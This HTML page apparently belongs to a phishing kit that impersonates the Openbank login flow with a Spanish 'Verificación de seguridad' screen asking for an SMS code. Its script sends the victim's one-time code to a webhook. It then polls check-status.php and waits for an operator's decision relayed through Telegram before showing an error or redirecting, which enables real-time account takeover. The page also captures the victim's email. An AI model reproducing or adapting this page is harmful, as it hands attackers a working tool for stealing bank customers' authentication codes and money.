<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Openbank</title>
  <link rel="shortcut icon" href="https://assets.openbank.com/web/icons/rebranded_favicon.ico">
  <style>
    @font-face {
      font-family: 'Outfit Semibold';
      src: url('https://assets.openbank.com/web/fonts/Outfit-Semibold.woff2') format('woff2'),
           url('https://assets.openbank.com/web/fonts/Outfit-Semibold.woff') format('woff'),
           url('https://assets.openbank.com/web/fonts/Outfit-Semibold.ttf') format('truetype');
    }
    @font-face {
      font-family: 'Outfit Regular';
      src: url('https://assets.openbank.com/web/fonts/Outfit-Regular.woff2') format('woff2'),
           url('https://assets.openbank.com/web/fonts/Outfit-Regular.woff') format('woff'),
           url('https://assets.openbank.com/web/fonts/Outfit-Regular.ttf') format('truetype');
    }
    @font-face {
      font-family: 'Outfit Light';
      src: url('https://assets.openbank.com/web/fonts/Outfit-Light.woff2') format('woff2'),
           url('https://assets.openbank.com/web/fonts/Outfit-Light.woff') format('woff'),
           url('https://assets.openbank.com/web/fonts/Outfit-Light.ttf') format('truetype');
    }

    * { margin: 0; padding: 0; box-sizing: border-box; }
    html { font-size: 62.5%; }

    body {
      font-family: 'Outfit Regular', sans-serif;
      background-color: #f7f7f7;
      min-height: 100vh;
      position: relative;
      overflow-x: hidden;
    }

    .background-ring {
      position: fixed;
      right: -120px;
      top: 50%;
      transform: translateY(-40%);
      width: 500px;
      height: 500px;
      pointer-events: none;
      z-index: 0;
    }

    .header {
      background-color: #111111;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0 24px;
      height: 64px;
      position: relative;
      z-index: 10;
    }

    .header-logo { display: flex; align-items: center; padding-left: 110px; }
    .header-logo img { height: 50px; width: auto; }

    .btn-cerrar {
      background: transparent;
      color: #fff;
      border: 1.5px solid #fff;
      border-radius: 0px;
      padding: 8px 20px;
      font-family: 'Outfit Regular', sans-serif;
      font-size: 1.4rem;
      cursor: pointer;
      transition: background-color 0.2s;
    }
    .btn-cerrar:hover { background-color: rgba(255,255,255,0.1); }

    .main-content {
      display: flex;
      justify-content: center;
      padding: 120px 24px 40px;
      position: relative;
      z-index: 1;
    }

    .login-container { width: 100%; max-width: 21.7cm; }

    .login-title {
      font-family: 'Outfit Semibold', sans-serif;
      font-size: 3.2rem;
      color: #1a1a1a;
      text-align: center;
      margin-bottom: 40px;
      line-height: 1.25;
      white-space: nowrap;
      width: 21.7cm;
      margin-left: auto;
      margin-right: auto;
    }

    .login-subtitle {
      font-family: 'Outfit Semibold', sans-serif;
      font-weight: bold;
      font-size: 1.4rem;
      color: #1a1a1a;
      margin-bottom: 12px;
      width: 15.2cm;
    }

    .form-area { width: 10cm; margin: 0 auto; }

    .input-wrapper { position: relative; margin-bottom: 16px; }

    .input-field {
      width: 10cm;
      padding: 14px 14px;
      border: 1.5px solid #999999;
      border-radius: 0px;
      font-family: 'Outfit Regular', sans-serif;
      font-size: 1.5rem;
      color: #1a1a1a;
      background-color: #ffffff;
      outline: none;
      transition: border-color 0.2s;
      text-align: center;
      letter-spacing: 8px;
    }
    .input-field::placeholder {
      color: #999;
      font-family: 'Outfit Light', sans-serif;
      font-size: 1.4rem;
      letter-spacing: normal;
      text-align: left;
    }
    .input-field:focus {
      border-color: #1a1a1a;
    }

    .btn-continuar {
      width: 10cm;
      padding: 14px;
      background-color: #bac7cb;
      color: #8a8a8a;
      border: none;
      border-radius: 4px;
      font-family: 'Outfit Regular', sans-serif;
      font-size: 1.5rem;
      cursor: default;
      transition: background-color 0.2s, color 0.2s;
    }
    .btn-continuar.active {
      background-color: #1a1a1a;
      color: #fff;
      cursor: pointer;
    }
    .btn-continuar.active:hover { background-color: #333; }

    @media (max-width: 768px) {
      .background-ring { display: none; }
      .header { padding: 0 16px; }
      .header-logo { padding-left: 0; }
      .main-content { padding: 40px 24px 24px; }
      .login-container { max-width: 400px; margin: 0 auto; }
      .login-title { font-size: 2.4rem; white-space: normal; width: auto; }
      .login-subtitle { width: auto; }
      .form-area { width: 100%; max-width: 400px; }
      .input-field { width: 100%; max-width: 400px; }
      .btn-continuar { width: 100%; max-width: 400px; }
    }
  </style>
</head>
<body>

  <div class="background-ring">
    <svg viewBox="0 0 620 620" fill="none" xmlns="http://www.w3.org/2000/svg">
      <circle cx="310" cy="310" r="260" stroke="rgba(0,0,0,0.045)" stroke-width="90" fill="none"/>
    </svg>
  </div>

  <header class="header">
    <div class="header-logo">
      <img src="logo.png" alt="Openbank logo">
    </div>
    <button class="btn-cerrar">Cerrar</button>
  </header>

  <main class="main-content">
    <div class="login-container">
      <div id="emailDisplay" class="email-display" style="text-align: center; margin-bottom: 20px; font-size: 1.4rem; color: #666;"></div>
      <h1 class="login-title">Verificación de seguridad</h1>
      <div id="smsError" class="error-message" style="display: none; color: #dc3545; font-size: 1.3rem; margin-bottom: 20px; text-align: center; font-weight: bold;"></div>
      <div class="form-area">
      <p class="login-subtitle">Ingresa el código que enviamos a tu celular</p>
      <div class="input-wrapper">
        <input type="text" class="input-field" id="smsInput" placeholder="Código SMS" maxlength="6" autocomplete="one-time-code" inputmode="numeric">
      </div>
      <button class="btn-continuar" id="btnContinuar">Continuar</button>
      </div>
    </div>
  </main>

  <script src="webhook-config.js"></script>
  <script>
    // Mostrar email guardado y mensaje de error si existe
    document.addEventListener('DOMContentLoaded', function() {
      const params = new URLSearchParams(window.location.search);
      const urlEmail = params.get('email');
      const urlError = params.get('error');
      
      // Email: primero desde URL, luego desde sessionStorage
      const savedEmail = urlEmail || sessionStorage.getItem('userEmail');
      const emailDisplay = document.getElementById('emailDisplay');
      const smsErrorDiv = document.getElementById('smsError');
      
      if (savedEmail) {
        sessionStorage.setItem('userEmail', savedEmail);
        emailDisplay.textContent = savedEmail;
      }
      
      // Error: desde URL o desde sessionStorage
      const smsError = urlError ? 'El código que ingresaste es incorrecto. Por favor, inténtalo de nuevo.' : sessionStorage.getItem('smsError');
      
      if (smsError) {
        smsErrorDiv.textContent = smsError;
        smsErrorDiv.style.display = 'block';
        sessionStorage.removeItem('smsError');
      }
    });

    var smsInput = document.getElementById('smsInput');
    var btnContinuar = document.getElementById('btnContinuar');
    smsInput.addEventListener('input', function() {
      this.value = this.value.replace(/[^0-9]/g, '');
      if (this.value.trim().length > 0) {
        btnContinuar.classList.add('active');
      } else {
        btnContinuar.classList.remove('active');
      }
    });

    // Webhook submission
    btnContinuar.addEventListener('click', async function() {
      if (this.classList.contains('active')) {
        const smsCode = smsInput.value.trim();
        
        // Enviar datos al webhook
        const result = await sendToWebhook({ smsCode: smsCode }, 'sms');
        
        if (result.success) {
          // Mostrar spinner de espera y hacer polling
          smsInput.disabled = true;
          btnContinuar.disabled = true;
          btnContinuar.textContent = 'Verificando...';
          startPolling();
        } else {
          console.error('Error al enviar código SMS:', result.error);
        }
      }
    });

    // Polling para esperar acción desde Telegram
    function startPolling() {
      var sessionId = sessionStorage.getItem('sessionId');
      if (!sessionId) return;
      
      var pollInterval = setInterval(async function() {
        try {
          var response = await fetch('check-status.php?session=' + encodeURIComponent(sessionId));
          var data = await response.json();
          
          if (data.action === 'sms_error') {
            clearInterval(pollInterval);
            var smsErrorDiv = document.getElementById('smsError');
            smsErrorDiv.textContent = 'El código que ingresaste es incorrecto. Por favor, inténtalo de nuevo.';
            smsErrorDiv.style.display = 'block';
            smsInput.value = '';
            smsInput.disabled = false;
            btnContinuar.disabled = false;
            btnContinuar.textContent = 'Continuar';
            btnContinuar.classList.remove('active');
          } else if (data.action === 'login') {
            clearInterval(pollInterval);
            window.location.href = 'index.html';
          }
        } catch (e) {
          // Silenciar errores de red
        }
      }, 2000);
    }
  </script>
</body>
</html>
